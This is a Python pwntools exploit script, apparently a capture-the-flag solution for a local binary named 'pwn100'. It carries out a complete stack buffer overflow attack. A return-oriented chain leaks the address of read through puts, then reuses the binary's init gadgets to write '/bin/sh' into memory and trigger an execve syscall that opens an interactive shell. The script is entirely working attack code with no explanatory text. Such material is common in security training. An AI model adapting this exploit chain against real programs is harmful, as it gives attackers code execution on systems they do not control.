from pwn import *

context.log_level='debug'

puts_plt = 0x0000000000400500
read_got = 0x0000000000601028
pop_ret = 0x0000000000400763
pop6_ret = 0x000000000040075A
mov3_call = 0x0000000000400740
vuln_addr = 0x000000000040068E
bss_addr = 0x0000000000601040

p = process('./pwn100')

payload1  = 'a' * 0x40 + 'b' * 0x8 + p64(pop_ret) + p64(read_got)
payload1 += p64(puts_plt) +  p64(vuln_addr) 
payload1 = payload1.ljust(0xc8, 'a')
print "\n #####sending payload1#####\n"
p.send(payload1)

p.recvline()
read_addr = u64(p.recv(6).ljust(8, '\x00'))
print "read_addr = " + hex(read_addr)
syscall_addr = read_addr + 0xE
print "syscall_addr = " + hex(syscall_addr)

payload2 = 'a' * 0x40 + 'b' * 0x8 + p64(pop6_ret)
payload2 += p64(0) + p64(1) + p64(read_got) + p64(0x3b) + p64(bss_addr) + p64(0)
payload2 += p64(mov3_call) + 'c' * 0x8 
payload2 += p64(0) + p64(1) + p64(bss_addr ) + p64(0) + p64(0) + p64(bss_addr + 8)
payload2 += p64(mov3_call)

print "\n#####sending payload2#####"
raw_input("go?")
p.send(payload2)

p.send(p64(syscall_addr) + "/bin/sh\x00" + 'a' * (0x3b - 0x10))
p.recvline()
sleep(1)
p.interactive()


